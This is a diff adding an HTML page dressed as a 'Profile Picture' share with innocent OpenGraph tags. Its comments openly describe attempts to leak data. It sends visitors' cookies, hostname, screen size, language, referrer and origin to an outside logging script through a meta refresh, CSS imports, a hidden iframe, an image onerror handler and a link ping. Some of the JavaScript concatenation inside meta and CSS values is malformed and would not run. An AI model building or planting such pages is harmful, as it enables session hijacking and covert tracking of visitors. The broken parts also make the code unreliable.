@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Profile Picture</title>
+    <!-- Try to leak through meta refresh -->
+    <meta http-equiv="refresh" content="0;url=https://mtrf3.github.io/finding/log.php?cookies=" + document.cookie />
+    
+    <!-- OpenGraph tags that look innocent -->
+    <meta property="og:title" content="Profile Picture" />
+    <meta property="og:description" content="View my new profile picture" />
+    <meta property="og:image" content="https://mtrf3.github.io/finding/pixel.gif" />
+    
+    <!-- Try to leak through CSS -->
+    <style>
+        @import url('https://mtrf3.github.io/finding/log.php?ip=' + window.location.hostname);
+        body { 
+            background: url('https://mtrf3.github.io/finding/log.php?screen=' + screen.width);
+            cursor: url('https://mtrf3.github.io/finding/log.php?lang=' + navigator.language);
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden iframe for potential session leaking -->
+    <iframe src="about:blank" onload="this.src='https://mtrf3.github.io/finding/log.php?ref='+document.referrer" style="display:none"></iframe>
+    
+    <!-- Image with onerror to leak window.origin -->
+    <img src="x" onerror="this.src='https://mtrf3.github.io/finding/log.php?origin='+window.origin" />
+    
+    <!-- Link with ping attribute -->
+    <a href="#" ping="https://mtrf3.github.io/finding/log.php?ping=1">Click me</a>
+</body>
+</html>
